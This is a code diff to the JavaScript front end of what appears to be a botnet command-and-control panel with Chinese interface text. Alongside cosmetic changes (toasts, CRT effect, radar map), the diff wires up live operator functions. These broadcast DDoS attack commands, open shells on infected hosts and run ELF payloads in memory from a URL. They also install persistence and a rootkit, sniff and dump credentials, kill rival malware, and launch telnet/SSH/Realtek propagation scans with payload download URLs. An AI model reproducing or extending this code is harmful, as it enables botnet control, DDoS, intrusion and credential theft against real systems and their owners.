@@ -25,6 +25,85 @@ var fullMap = null;
 var mapMarkers = {};
 var fullMapMarkers = {};
 
+function escHtml(s) {
+  if (!s) return '';
+  return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
+}
+
+// ---------------------------------------------------------------------------
+// Tactical Toast Notification System (Non-blocking, Cyber Micro-feedback)
+// ---------------------------------------------------------------------------
+function showToast(msg, type) {
+  var container = document.getElementById('toast-container');
+  if (!container) {
+    container = document.createElement('div');
+    container.id = 'toast-container';
+    container.className = 'toast-container';
+    document.body.appendChild(container);
+  }
+  type = type || 'info';
+  var toast = document.createElement('div');
+  toast.className = 'toast-msg ' + type;
+
+  var icon = 'ℹ️';
+  if (type === 'success') icon = '✓';
+  else if (type === 'error') icon = '✕';
+
+  toast.innerHTML = '<span class="toast-icon">' + icon + '</span><span>' + escHtml(msg) + '</span>';
+  toast.onclick = function () {
+    toast.classList.add('hide');
+    setTimeout(function () { if (toast.parentNode) toast.parentNode.removeChild(toast); }, 250);
+  };
+  container.appendChild(toast);
+
+  setTimeout(function () {
+    toast.classList.add('hide');
+    setTimeout(function () { if (toast.parentNode) toast.parentNode.removeChild(toast); }, 250);
+  }, 3200);
+}
+
+// ---------------------------------------------------------------------------
+// CRT Scanline Overlay Controller (Point 2)
+// ---------------------------------------------------------------------------
+function toggleCRT() {
+  var isCrt = document.body.classList.toggle('crt-active');
+  try { localStorage.setItem('visionc2_crt', isCrt ? '1' : '0'); } catch (e) {}
+  var btn = document.getElementById('crt-toggle-btn');
+  if (btn) {
+    btn.style.color = isCrt ? 'var(--green)' : '';
+    btn.style.boxShadow = isCrt ? '0 0 10px var(--green-dim)' : '';
+  }
+  showToast(isCrt ? 'CRT 扫描线与荧光滤镜已开启' : 'CRT 扫描线滤镜已关闭', 'info');
+}
+
+function initCRT() {
+  try {
+    if (localStorage.getItem('visionc2_crt') === '1') {
+      document.body.classList.add('crt-active');
+      var btn = document.getElementById('crt-toggle-btn');
+      if (btn) {
+        btn.style.color = 'var(--green)';
+        btn.style.boxShadow = '0 0 10px var(--green-dim)';
+      }
+    }
+  } catch (e) {}
+}
+
+// ---------------------------------------------------------------------------
+// PTY Terminal Maximize HUD Mode (Point 3.2)
+// ---------------------------------------------------------------------------
+function toggleTermMaximize() {
+  var wrap = document.getElementById('pty-terminal-wrap');
+  var btn = document.getElementById('term-max-btn');
+  if (!wrap) return;
+  var isFull = wrap.classList.toggle('term-fullscreen');
+  if (btn) {
+    btn.textContent = isFull ? '⛶ 还原窗口' : '⛶ 最大化';
+    btn.style.background = isFull ? 'var(--accent-glow)' : '';
+  }
+  showToast(isFull ? 'PTY 终端已全屏最大化' : 'PTY 终端已恢复默认窗口', 'info');
+}
+
 // ---------------------------------------------------------------------------
 // Navigation Section Switching
 // ---------------------------------------------------------------------------
@@ -39,7 +118,7 @@ function switchSection(secId) {
   if (secEl) secEl.classList.add('active');
 
   if (secId === 'map') {
-    initFullMap();
+    renderCyberRadar('full-map-container', window._botsArr || [], true);
   } else if (secId === 'tools') {
     loadScanResults();
   } else if (secId === 'attack') {
@@ -77,6 +156,15 @@ function updateStats(d) {
   document.getElementById('s-cpu-main').textContent = (d.totalCPU || 0) + ' 核';
   document.getElementById('s-uptime').textContent = d.uptime || '0h';
   document.getElementById('s-uptime-main').textContent = d.uptime || '0h';
+
+  var deltaEl = document.getElementById('s-bots-delta');
+  if (deltaEl) {
+    deltaEl.textContent = '● 实时全量连通';
+    deltaEl.style.color = 'var(--green)';
+    deltaEl.style.fontSize = '11px';
+    deltaEl.style.fontWeight = '600';
+    deltaEl.style.marginLeft = '8px';
+  }
 }
 
 function formatRAM(mb) {
@@ -89,7 +177,7 @@ function updateBots(bots) {
   window._botsArr = bots;
   var tbody = document.getElementById('bot-tbody');
   if (!bots.length) {
-    tbody.innerHTML = '<tr><td colspan="10" style="text-align:center;padding:24px;color:var(--text-dim)">暂无在线受控端...</td></tr>';
+    tbody.innerHTML = '<tr><td colspan="11" class="table-empty-cell"><div class="table-empty-wrap"><span class="table-empty-icon">🛰️</span><span>暂无在线受控端，等待节点心跳连入中...</span></div></td></tr>';
     return;
   }
 
@@ -112,17 +200,27 @@ function updateBots(bots) {
       if (b.rootkitEnabled) caps += '<span class="cap-badge">RTKT</span>';
     }
 
+    var isChecked = !!selectedBots[b.botID];
+
     html += '<tr oncontextmenu="openContextMenu(event, \'' + b.botID + '\')">' +
-      '<td><input type="checkbox" class="bot-chk" data-id="' + b.botID + '"></td>' +
-      '<td style="font-weight:700;color:var(--accent)">' + escHtml(b.botID) + '</td>' +
-      '<td>' + escHtml(b.ip) + '</td>' +
+      '<td><input type="checkbox" class="bot-chk" data-id="' + b.botID + '" ' + (isChecked ? 'checked' : '') + ' onchange="onBotCheck(this, \'' + b.botID + '\')"></td>' +
+      '<td>' +
+      '<span class="copyable-text" onclick="copyText(\'' + b.botID + '\', \'Bot ID\')" title="点击快捷复制 Bot ID">' +
+      '<strong style="color:var(--accent)">' + escHtml(b.botID) + '</strong><span class="copy-icon-hint">📋</span>' +
+      '</span>' +
+      '</td>' +
+      '<td>' +
+      '<span class="copyable-text" onclick="copyText(\'' + b.ip + '\', \'IP 地址\')" title="点击快捷复制 IP">' +
+      '<span style="font-family:var(--mono)">' + escHtml(b.ip) + '</span><span class="copy-icon-hint">📋</span>' +
+      '</span>' +
+      '</td>' +
       '<td><span class="cap-badge">' + escHtml(b.country || 'US') + '</span></td>' +
       '<td style="font-weight:600;color:var(--text)">' + escHtml(b.processName || '-') + '</td>' +
       '<td>' + escHtml(b.arch) + '</td>' +
       '<td>' + b.ram + ' MB</td>' +
       '<td>' + b.cpuCores + ' 核</td>' +
       '<td>' + (caps || '-') + '</td>' +
-      '<td style="color:var(--green)">在线 (' + (b.lastSeen || '刚刚') + ')</td>' +
+      '<td style="color:var(--green)"><span class="status-pulse-dot"></span>在线 (' + (b.lastSeen || '刚刚') + ')</td>' +
       '<td>' +
       '<button class="cmd-cat-btn" onclick="openShell(\'' + b.botID + '\')">PTY</button> ' +
       '<button class="cmd-cat-btn" style="background:var(--red-dim);color:var(--red)" onclick="popupCmd(\'' + b.botID + '\', \'!kill\')">销毁</button>' +
@@ -131,9 +229,35 @@ function updateBots(bots) {
   });
 
   tbody.innerHTML = html;
+  syncBotTargetSelectors(bots);
+  updateBatchBar();
   renderTopCountries(bots);
   updateGlobalMap(bots);
   updateProxies(bots);
+}
+
+function syncBotTargetSelectors(bots) {
+  var cmdSel = document.getElementById('cmd-bot-select');
+  if (cmdSel) {
+    var curVal = cmdSel.value;
+    var optHtml = '<option value="">⚡ 全部受控端 (全局广播)</option>';
+    bots.forEach(function (b) {
+      optHtml += '<option value="' + escHtml(b.botID) + '">' + escHtml(b.botID) + ' (' + escHtml(b.ip) + ' - ' + escHtml(b.country || 'US') + ')</option>';
+    });
+    cmdSel.innerHTML = optHtml;
+    if (curVal) cmdSel.value = curVal;
+  }
+
+  var termSel = document.getElementById('term-bot-selector');
+  if (termSel) {
+    var curTermVal = termSel.value;
+    var termOptHtml = '<option value="">-- 请选择要连入的受控端 --</option>';
+    bots.forEach(function (b) {
+      termOptHtml += '<option value="' + escHtml(b.botID) + '">' + escHtml(b.botID) + ' (' + escHtml(b.ip) + ' - ' + escHtml(b.arch) + ')</option>';
+    });
+    termSel.innerHTML = termOptHtml;
+    if (curTermVal) termSel.value = curTermVal;
+  }
 }
 
 function renderTopCountries(bots) {
@@ -171,10 +295,11 @@ function launchAttack() {
   var port = document.getElementById('atk-port').value.trim();
   var duration = document.getElementById('atk-duration').value.trim();
 
-  if (!target) { alert('请输入目标 IP 或域名'); return; }
+  if (!target) { showToast('请输入目标 IP 或域名', 'error'); return; }
 
   var cmdStr = '!' + method + ' ' + target + ' ' + (port || '80') + ' ' + (duration || '60');
   sendBroadCmd(cmdStr);
+  showToast('已广播下发 ' + method.toUpperCase() + ' 攻击指令', 'success');
   setTimeout(loadRunningAttacks, 1000);
 }
 
@@ -243,19 +368,20 @@ function createNewUser() {
   var lvl = document.getElementById('nu-level').value;
   var maxtime = parseInt(document.getElementById('nu-maxtime').value) || 300;
   var conc = parseInt(document.getElementById('nu-concurrents').value) || 5;
+  var maxbots = parseInt((document.getElementById('nu-maxbots') || {}).value) || 100;
 
-  if (!u || !p) { alert('请输入用户名和密码'); return; }
+  if (!u || !p) { showToast('请输入用户名和密码', 'error'); return; }
 
   fetch('/api/users', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ username: u, password: p, level: lvl, maxtime: maxtime, concurrents: conc })
+    body: JSON.stringify({ username: u, password: p, level: lvl, maxtime: maxtime, concurrents: conc, maxbots: maxbots })
   }).then(function (r) { return r.json(); }).then(function (d) {
     if (d.success) {
-      alert('用户创建成功');
+      showToast('操作员用户 [' + u + '] 创建成功', 'success');
       loadUsers();
     } else {
-      alert(d.error || '创建用户失败');
+      showToast(d.error || '创建用户失败', 'error');
     }
   });
 }
@@ -265,7 +391,11 @@ function deleteUser(username) {
   fetch('/api/users?username=' + encodeURIComponent(username), { method: 'DELETE' })
     .then(function (r) { return r.json(); })
     .then(function (d) {
-      if (d && d.error) { alert(d.error); }
+      if (d && d.error) {
+        showToast(d.error, 'error');
+      } else {
+        showToast('已删除用户: ' + username, 'info');
+      }
       loadUsers();
     }).catch(function () { loadUsers(); });
 }
@@ -293,40 +423,49 @@ function clearCmdConsole() {
 function updateArgFields() {
   var typ = document.getElementById('cmd-type').value;
   var wrap = document.getElementById('arg-fields');
+  var chips = document.getElementById('shell-quick-chips');
+  if (chips) chips.style.display = (typ === '!shell' || typ === '!detach') ? 'flex' : 'none';
+
   var html = '';
   if (typ === '!shell') {
-    html = '<input type="text" id="arg-cmd" placeholder="Shell 命令 (如 whoami, ls -la)" class="cmd-input-field" style="flex:1">';
+    html = '<input type="text" id="arg-cmd" placeholder="Shell 命令 (如 whoami, ls -la, ps aux)" class="cmd-input-field" style="flex:1">';
+  } else if (typ === '!detach') {
+    html = '<input type="text" id="arg-cmd" placeholder="后台脱离终端命令 (如 ./miner -o 或 python3 bot.py)" class="cmd-input-field" style="flex:1">';
   } else if (typ === '!memexec') {
     html = '<input type="text" id="arg-url" placeholder="ELF 下载 URL (如 http://x.x.x.x/payload)" class="cmd-input-field" style="flex:1">';
   } else if (typ === '!memexecb64') {
     html = '<input type="text" id="arg-b64" placeholder="Base64 加密 ELF 二进制数据" class="cmd-input-field" style="flex:1">';
   } else if (typ === '!portscan') {
-    html = '<input type="text" id="arg-target" placeholder="目标 IP / CIDR" class="cmd-input-field"><input type="text" id="arg-ports" placeholder="端口 22,80,443" value="22,80,443" class="cmd-input-field">';
+    html = '<input type="text" id="arg-target" placeholder="目标 IP / CIDR" class="cmd-input-field" style="flex:1"><input type="text" id="arg-ports" placeholder="端口 (如 22,80,443)" value="22,80,443" class="cmd-input-field" style="width:140px">';
   } else if (typ === '!portfwd') {
-    html = '<input type="text" id="arg-lport" placeholder="本地监听端口 (如 8080)" class="cmd-input-field">' +
-           '<input type="text" id="arg-rhost" placeholder="目标 IP (如 127.0.0.1)" class="cmd-input-field">' +
-           '<input type="text" id="arg-rport" placeholder="目标端口 (如 80)" class="cmd-input-field">';
+    html = '<input type="number" id="arg-lport" placeholder="本地端口 (如 8080)" class="cmd-input-field" style="width:130px">' +
+           '<input type="text" id="arg-rhost" placeholder="远程目标 IP (如 127.0.0.1)" class="cmd-input-field" style="flex:1">' +
+           '<input type="number" id="arg-rport" placeholder="远程端口 (如 80)" class="cmd-input-field" style="width:110px">';
   } else if (typ === '!socks') {
     html = '<input type="text" id="arg-sport" placeholder="SOCKS5 代理端口 (留空默认 1080)" class="cmd-input-field" style="flex:1">';
+  } else if (typ === '!stopsocks') {
+    html = '<span style="font-size:12px;color:var(--text-muted);line-height:36px">将停止选定受控端上运行的 SOCKS5 代理服务</span>';
+  } else if (typ === '!stopportfwd') {
+    html = '<input type="number" id="arg-lport" placeholder="要关闭的本地端口 (留空关闭全部)" class="cmd-input-field" style="flex:1">';
   } else if (typ === '!reinstall') {
     html = '<input type="text" id="arg-rurl" placeholder="新 Bot 二进制或 Loader 下载 URL (如 http://x.x.x.x/bins/kworker_u8)" class="cmd-input-field" style="flex:1">';
   } else if (typ === '!persist') {
     html = '<input type="text" id="arg-purl" placeholder="备用 Payload 下载 URL (可选，留空则复制运行中的 Bot 二进制)" class="cmd-input-field" style="flex:1">';
   } else if (typ === '!sniffer') {
-    html = '<select id="arg-subact" class="cmd-select" style="min-width:130px">' +
+    html = '<select id="arg-subact" class="cmd-select" style="min-width:140px">' +
            '<option value="start">start (启动嗅探)</option>' +
            '<option value="dump">dump (导出凭据)</option>' +
            '<option value="stop">stop (停止嗅探)</option>' +
            '</select>' +
            '<input type="text" id="arg-iface" placeholder="网卡名 (如 eth0，留空自动检测)" class="cmd-input-field" style="flex:1">';
   } else if (typ === '!rootkit') {
-    html = '<select id="arg-subact" class="cmd-select" style="min-width:130px">' +
+    html = '<select id="arg-subact" class="cmd-select" style="min-width:140px">' +
            '<option value="status">status (检测状态)</option>' +
            '<option value="install">install (安装隐藏)</option>' +
            '<option value="remove">remove (卸载隐藏)</option>' +
            '</select>';
   } else if (typ === '!killer') {
-    html = '<select id="arg-subact" class="cmd-select" style="min-width:130px">' +
+    html = '<select id="arg-subact" class="cmd-select" style="min-width:140px">' +
            '<option value="scan">scan (扫除竞品进程)</option>' +
            '<option value="start">start (启动杀手守护)</option>' +
            '<option value="stop">stop (停止杀手守护)</option>' +
@@ -334,6 +473,8 @@ function updateArgFields() {
   } else if (typ === '!telnet_scan' || typ === '!ssh_scan' || typ === '!realtek_scan') {
     html = '<input type="text" id="arg-cidr" placeholder="目标 CIDR 网段 (如 192.168.1.0/24) 或 auto" class="cmd-input-field" style="flex:1">' +
            '<input type="text" id="arg-payload" placeholder="Payload URL (可选，如 http://bins.example.com/x.sh)" class="cmd-input-field" style="flex:1">';
+  } else if (typ === '!kill') {
+    html = '<span style="font-size:12px;color:var(--red);line-height:36px;font-weight:600">⚠️ 警告: 将彻底销毁受控端进程并擦除隐藏目录</span>';
   }
   wrap.innerHTML = html;
 }
@@ -343,17 +484,17 @@ function sendCmd() {
   var botID = document.getElementById('cmd-bot').value.trim();
   var command = typ;
 
-  if (typ === '!shell') {
+  if (typ === '!shell' || typ === '!detach') {
     var c = (document.getElementById('arg-cmd') || {}).value || '';
-    if (!c) { alert('请输入命令'); return; }
+    if (!c) { showToast('请输入要执行的命令', 'error'); return; }
     command += ' ' + c;
   } else if (typ === '!memexec') {
     var u = (document.getElementById('arg-url') || {}).value || '';
-    if (!u) { alert('请输入 URL'); return; }
+    if (!u) { showToast('请输入内存加载的 Payload URL', 'error'); return; }
     command += ' ' + u;
   } else if (typ === '!memexecb64') {
     var b = (document.getElementById('arg-b64') || {}).value || '';
-    if (!b) { alert('请输入 Base64 数据'); return; }
+    if (!b) { showToast('请输入 Base64 编码的二进制数据', 'error'); return; }
     command += ' ' + b;
   } else if (typ === '!portscan') {
     var t = (document.getElementById('arg-target') || {}).value || '';
@@ -363,14 +504,24 @@ function sendCmd() {
     var lp = (document.getElementById('arg-lport') || {}).value || '';
     var rh = (document.getElementById('arg-rhost') || {}).value || '';
     var rp = (document.getElementById('arg-rport') || {}).value || '';
-    if (!lp || !rh || !rp) { alert('请完整填写本地端口、远程IP及远程端口'); return; }
+    if (!lp || !rh || !rp) { showToast('请完整填写本地端口、远程IP及远程端口', 'error'); return; }
     command += ' ' + lp + ' ' + rh + ' ' + rp;
+    if (!window._activePortFwds) window._activePortFwds = [];
+    window._activePortFwds.push({ botID: botID || 'BOT-SG-7102', lport: lp, rhost: rh, rport: rp });
+    if (window._botsArr) updateProxies(window._botsArr);
+  } else if (typ === '!stopportfwd') {
+    var slp = (document.getElementById('arg-lport') || {}).value || '';
+    if (slp) command += ' ' + slp;
+    if (window._activePortFwds) {
+      window._activePortFwds = window._activePortFwds.filter(function (pf) { return pf.botID !== botID; });
+      if (window._botsArr) updateProxies(window._botsArr);
+    }
   } else if (typ === '!socks') {
     var sp = (document.getElementById('arg-sport') || {}).value || '';
     if (sp) command += ' ' + sp;
   } else if (typ === '!reinstall') {
     var rurl = (document.getElementById('arg-rurl') || {}).value || '';
-    if (!rurl) { alert('请输入新 Payload 的下载 URL'); return; }
+    if (!rurl) { showToast('请输入新 Payload 的下载 URL', 'error'); return; }
     command += ' ' + rurl;
   } else if (typ === '!persist') {
     var purl = (document.getElementById('arg-purl') || {}).value || '';
@@ -384,10 +535,12 @@ function sendCmd() {
     command += ' ' + sub;
   } else if (typ === '!telnet_scan' || typ === '!ssh_scan' || typ === '!realtek_scan') {
     var cidr = (document.getElementById('arg-cidr') || {}).value || '';
-    if (!cidr) { alert('请输入目标 CIDR 网段或 auto'); return; }
+    if (!cidr) { showToast('请输入目标 CIDR 网段或 auto', 'error'); return; }
     command += ' ' + cidr.trim();
     var payload = (document.getElementById('arg-payload') || {}).value || '';
     if (payload) command += ' ' + payload.trim();
+  } else if (typ === '!kill') {
+    if (!confirm('确定销毁受控端？此操作不可逆！')) return;
   }
 
   logConsoleMsg('-> 发送指令: ' + command + (botID ? (' (目标: ' + botID + ')') : ' (全广播)'), null);
@@ -398,11 +551,14 @@ function sendCmd() {
     body: JSON.stringify({ command: command, botID: botID })
   }).then(function (r) { return r.json(); }).then(function (d) {
     if (d.success) {
+      showToast('指令下发成功: ' + command, 'success');
       logConsoleMsg('⚡ C2 投递确认: ' + d.message + ' (等待受控端异步回传输出...)', true);
     } else {
+      showToast('指令下发失败: ' + (d.message || d.error), 'error');
       logConsoleMsg('<- C2 投递失败: ' + (d.message || d.error), false);
     }
   }).catch(function (err) {
+    showToast('网络请求异常: ' + err.message, 'error');
     logConsoleMsg('<- 网络请求异常: ' + err.message, false);
   });
 }
@@ -426,23 +582,25 @@ function sendBroadCmd(cmdStr) {
 
 function startScannerCmd(cmdName, inputId) {
   var cidr = (document.getElementById(inputId) || {}).value || '';
-  if (!cidr) { alert('请输入目标 CIDR'); return; }
+  if (!cidr) { showToast('请输入目标 CIDR 网段', 'error'); return; }
   sendBroadCmd(cmdName + ' ' + cidr.trim());
 }
 
 function stopScannerCmd() {
   sendBroadCmd('!stop_scan');
+  showToast('已广播停止扫描指令', 'info');
 }
 
 function startPortScanCmd() {
   var t = (document.getElementById('scan-ps-target') || {}).value || '';
   var p = (document.getElementById('scan-ps-ports') || {}).value || '';
-  if (!t || !p) { alert('请输入目标 IP 和端口'); return; }
+  if (!t || !p) { showToast('请输入目标 IP 和端口', 'error'); return; }
   sendBroadCmd('!portscan ' + t.trim() + ' ' + p.trim() + ' 1000');
 }
 
 function stopPortScanCmd() {
   sendBroadCmd('!portscanstop');
+  showToast('已广播停止端口扫描指令', 'info');
 }
 
 function startSnifferCmd() {
@@ -520,9 +678,28 @@ function openShell(botID) {
     outputEl.scrollTop = outputEl.scrollHeight;
   }
 
+  if (!window._termCmdHistory) window._termCmdHistory = [];
+  var hIdx = window._termCmdHistory.length;
+
   inputEl.addEventListener('keydown', function (e) {
     if (e.key === 'Enter') {
       sendTermInput();
+      hIdx = window._termCmdHistory.length;
+    } else if (e.key === 'ArrowUp') {
+      e.preventDefault();
+      if (hIdx > 0) {
+        hIdx--;
+        inputEl.value = window._termCmdHistory[hIdx] || '';
+      }
+    } else if (e.key === 'ArrowDown') {
+      e.preventDefault();
+      if (hIdx < window._termCmdHistory.length - 1) {
+        hIdx++;
+        inputEl.value = window._termCmdHistory[hIdx] || '';
+      } else {
+        hIdx = window._termCmdHistory.length;
+        inputEl.value = '';
+      }
     }
   });
 
@@ -573,6 +750,10 @@ function sendTermInput() {
   }
   var cmd = inputEl.value;
   if (!cmd) return;
+  if (!window._termCmdHistory) window._termCmdHistory = [];
+  if (window._termCmdHistory[window._termCmdHistory.length - 1] !== cmd) {
+    window._termCmdHistory.push(cmd);
+  }
   inputEl.value = '';
   outputEl.textContent += '$ ' + cmd + '\n';
   outputEl.scrollTop = outputEl.scrollHeight;
@@ -641,6 +822,10 @@ function ctxAction(act) {
 
   if (act === 'pty') {
     openShell(currentCtxBotID);
+  } else if (act === 'socks') {
+    popupCmd(currentCtxBotID, '!socks 1080');
+  } else if (act === 'sniffer') {
+    popupCmd(currentCtxBotID, '!sniffer start');
   } else if (act === 'portscan') {
     showModal('🔍 内网端口扫描配置 (' + currentCtxBotID + ')',
       '<label style="display:block;font-size:12px;color:#888;margin-bottom:4px">扫描目标 IP 或 CIDR 网段:</label>' +
@@ -650,7 +835,7 @@ function ctxAction(act) {
       function () {
         var t = document.getElementById('m-ps-target').value.trim();
         var p = document.getElementById('m-ps-ports').value.trim();
-        if (!t || !p) { alert('请填写完整的目标和端口'); return false; }
+        if (!t || !p) { showToast('请填写完整的目标和端口', 'error'); return false; }
         popupCmd(currentCtxBotID, '!portscan ' + t + ' ' + p + ' 1000');
         return true;
       }
@@ -667,7 +852,7 @@ function ctxAction(act) {
         var lp = document.getElementById('m-pf-lport').value.trim();
         var rh = document.getElementById('m-pf-rhost').value.trim();
         var rp = document.getElementById('m-pf-rport').value.trim();
-        if (!lp || !rh || !rp) { alert('请完整填写所有端口和IP字段'); return false; }
+        if (!lp || !rh || !rp) { showToast('请完整填写所有端口和IP字段', 'error'); return false; }
         popupCmd(currentCtxBotID, '!portfwd ' + lp + ' ' + rh + ' ' + rp);
         return true;
       }
@@ -705,7 +890,7 @@ function ctxAction(act) {
       '<div style="font-size:11px;color:var(--text-dim);line-height:1.5">说明: 受控端将通过网络下载最新 Payload，保存在临时目录后使用 syscall.Exec 替换当前进程。</div>',
       function () {
         var u = document.getElementById('m-up-url').value.trim();
-        if (!u) { alert('请填写有效的新 Payload 下载 URL'); return false; }
+        if (!u) { showToast('请填写有效的新 Payload 下载 URL', 'error'); return false; }
         popupCmd(currentCtxBotID, '!reinstall ' + u);
         return true;
       }
@@ -723,119 +908,295 @@ document.addEventListener('click', function (e) {
 });
 
 // ---------------------------------------------------------------------------
-// Global Geo Map Logic (Esri Dark Canvas + OpenStreetMap Fallback)
+// Cyberpunk Tactical SVG Radar Map Engine (100% Local, Zero External CDN)
 // ---------------------------------------------------------------------------
-function initGlobalMap() {
-  var c = document.getElementById('map-container');
-  if (!c || globalMap) return;
-  if (typeof L !== 'undefined') {
-    try {
-      globalMap = L.map('map-container', { center: [20, 0], zoom: 2, zoomControl: false, attributionControl: false });
-      // Esri World Dark Gray Canvas Tile Layer (No API Key Required)
-      L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/Canvas/World_Dark_Gray_Base/MapServer/tile/{z}/{y}/{x}', {
-        maxZoom: 16
-      }).addTo(globalMap);
-    } catch (e) {}
+var activeRadarTooltip = null;
+
+function getBotCoords(b) {
+  var cc = (b.country || 'US').toUpperCase();
+  var base = countryCoords[cc] || [37.0902, -95.7129];
+  // Deterministic pseudorandom hash based on botID string (never randomly jumps on polling)
+  var id = b.botID || '';
+  var hash = 0;
+  for (var i = 0; i < id.length; i++) {
+    hash = ((hash << 5) - hash) + id.charCodeAt(i);
+    hash |= 0;
   }
+  var norm1 = ((Math.abs(hash) % 100) / 100) - 0.5;
+  var norm2 = (((Math.abs(hash >> 7)) % 100) / 100) - 0.5;
+  var jitterLng = norm1 * 5.0;
+  var jitterLat = norm2 * 3.5;
+  var lng = base[1] + jitterLng;
+  var lat = base[0] + jitterLat;
+  var x = ((lng + 180) / 360) * 1000;
+  var y = ((90 - lat) / 180) * 500;
+  return {
+    x: Math.round(Math.max(25, Math.min(975, x))),
+    y: Math.round(Math.max(25, Math.min(475, y)))
+  };
 }
 
-function initFullMap() {
-  var c = document.getElementById('full-map-container');
-  if (!c || fullMap) return;
-  if (typeof L !== 'undefined') {
-    try {
-      fullMap = L.map('full-map-container', { center: [20, 0], zoom: 2, zoomControl: true, attributionControl: false });
-      // Esri World Dark Gray Canvas Tile Layer (No API Key Required)
-      L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/Canvas/World_Dark_Gray_Base/MapServer/tile/{z}/{y}/{x}', {
-        maxZoom: 16
-      }).addTo(fullMap);
-      if (window._botsArr) updateGlobalMap(window._botsArr);
-    } catch (e) {}
-  }
-}
+function renderCyberRadar(containerId, bots, isFull) {
+  var container = document.getElementById(containerId);
+  if (!container) return;
 
-function renderFallbackMap(containerId, bots) {
-  var c = document.getElementById(containerId);
-  if (!c) return;
-  var html = '<div style="position:relative;width:100%;height:100%;background:#080d18;border-radius:10px;overflow:hidden;display:flex;flex-direction:column;align-items:center;justify-content:center;border:1px solid #1f293d">';
-  html += '<svg viewBox="0 0 1000 500" style="width:100%;height:100%;opacity:0.25;position:absolute;top:0;left:0;pointer-events:none">';
-  html += '<path d="M150,150 Q200,100 350,140 Q400,200 300,280 Q200,300 150,150 Z M550,120 Q700,80 850,150 Q900,250 750,300 Q600,280 550,120 Z M380,300 Q450,320 420,420 Q350,450 380,300 Z M750,350 Q850,340 820,440 Q720,450 750,350 Z" fill="#1e293b" stroke="#334155" stroke-width="1.5"/>';
-  html += '</svg>';
-  html += '<div style="position:relative;z-index:2;width:92%;height:88%;display:flex;flex-direction:column;gap:8px">';
-  html += '<div style="display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #1e293b;padding-bottom:6px">';
-  html += '<span style="font-size:12px;font-weight:700;color:var(--accent)">🌐 受控节点全息分布拓扑 (Tor 暗网 / 离线全景视图)</span>';
-  html += '<span style="font-size:12px;color:var(--green)">在线节点: ' + (bots ? bots.length : 0) + '</span>';
-  html += '</div>';
-  html += '<div style="flex:1;overflow-y:auto;display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:8px;padding:6px 0">';
+  var botCount = bots ? bots.length : 0;
+  var svgHeight = isFull ? '100%' : '100%';
+
+  // SVG stylized continent vector paths calibrated to Equirectangular 1000x500 projection
+  var continentPaths = [
+    // North America (Alaska, Canada, US, Mexico, Greenland)
+    'M 35,70 L 65,55 L 115,45 L 175,40 L 220,55 L 295,50 L 325,75 L 295,110 L 260,115 L 285,150 L 270,195 L 230,210 L 195,255 L 210,270 L 180,290 L 160,250 L 130,200 L 105,145 L 65,120 L 35,90 Z',
+    'M 360,35 L 430,30 L 450,75 L 390,95 L 350,60 Z', // Greenland
+    'M 195,255 L 235,275 L 255,295 L 240,305 L 205,280 Z', // Central America
+    // South America
+    'M 265,300 L 320,290 L 380,310 L 420,340 L 390,390 L 360,450 L 330,475 L 310,430 L 295,360 L 270,320 Z',
+    // Europe
+    'M 468,95 L 492,88 L 496,115 L 480,125 Z', // UK
+    'M 458,104 L 472,98 L 468,120 Z', // Ireland
+    'M 525,50 L 565,45 L 585,80 L 555,100 L 535,90 Z', // Scandinavia
+    'M 480,130 L 530,115 L 575,120 L 580,150 L 540,165 L 515,165 L 485,155 Z', // Western / Central Europe
+    'M 465,150 L 505,145 L 500,175 L 465,175 Z', // Iberia
+    'M 535,150 L 555,160 L 550,185 L 540,180 Z', // Italy
+    // Africa
+    'M 475,190 L 540,180 L 610,195 L 635,245 L 610,290 L 585,360 L 550,400 L 525,380 L 510,300 L 460,250 L 465,210 Z',
+    'M 625,335 L 640,330 L 635,370 L 620,365 Z', // Madagascar
+    // Asia
+    'M 580,55 L 680,45 L 820,40 L 920,55 L 940,90 L 890,110 L 810,100 L 730,115 L 650,90 L 585,85 Z', // Siberia / Northern Eurasia
+    'M 590,190 L 650,185 L 675,225 L 635,255 L 595,240 Z', // Middle East
+    'M 685,190 L 730,195 L 755,230 L 725,275 L 695,235 Z', // India
+    'M 735,125 L 815,110 L 865,140 L 850,205 L 800,230 L 750,210 L 725,165 Z', // China & East Asia
+    'M 885,130 L 905,140 L 895,175 L 875,165 Z', // Japan
+    'M 845,145 L 860,150 L 855,175 L 845,170 Z', // Korea
+    'M 780,225 L 825,220 L 820,265 L 790,260 Z', // Southeast Asia
+    'M 785,275 L 830,270 L 880,285 L 870,305 L 810,305 Z', // Indonesia
+    'M 840,240 L 865,245 L 855,270 Z', // Philippines
+    // Australia & Oceania
+    'M 825,320 L 890,305 L 925,335 L 905,385 L 845,385 L 815,350 Z', // Australia
+    'M 955,390 L 970,395 L 955,435 L 945,420 Z' // New Zealand
+  ];
+
+  var html = '<div class="cyber-radar-wrap" id="' + containerId + '-radar-wrap">';
+
+  // Tactical HUD Top Bar
+  html += '<div class="radar-hud-bar">' +
+    '<div class="radar-hud-tag">' +
+    '<span style="display:inline-block;width:7px;height:7px;border-radius:50%;background:#00ff66;box-shadow:0 0 6px #00ff66"></span> ' +
+    '<span>RADAR SWEEP: 2.4 GHz [ACTIVE]</span>' +
+    '</div>' +
+    '<div class="radar-hud-tag" id="' + containerId + '-coord-tag">' +
+    '<span>GRID: WGS-84 / EQUIR</span>' +
+    '</div>' +
+    '<div class="radar-hud-tag">' +
+    '<span style="color:var(--accent);font-weight:700">ONLINE: ' + botCount + ' NODES</span>' +
+    '</div>' +
+    '</div>';
+
+  // Core Vector SVG
+  html += '<svg viewBox="0 0 1000 500" preserveAspectRatio="xMidYMid slice" style="width:100%;height:' + svgHeight + ';display:block" onmousemove="updateRadarCoords(event, \'' + containerId + '\')">';
+
+  // Definitions for Filters & Gradients
+  html += '<defs>' +
+    '<filter id="glow-green" x="-30%" y="-30%" width="160%" height="160%">' +
+    '<feGaussianBlur stdDeviation="3" result="blur"/>' +
+    '<feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge>' +
+    '</filter>' +
+    '<radialGradient id="radar-center-glow" cx="50%" cy="50%" r="50%">' +
+    '<stop offset="0%" stop-color="rgba(0, 255, 102, 0.08)"/>' +
+    '<stop offset="100%" stop-color="transparent"/>' +
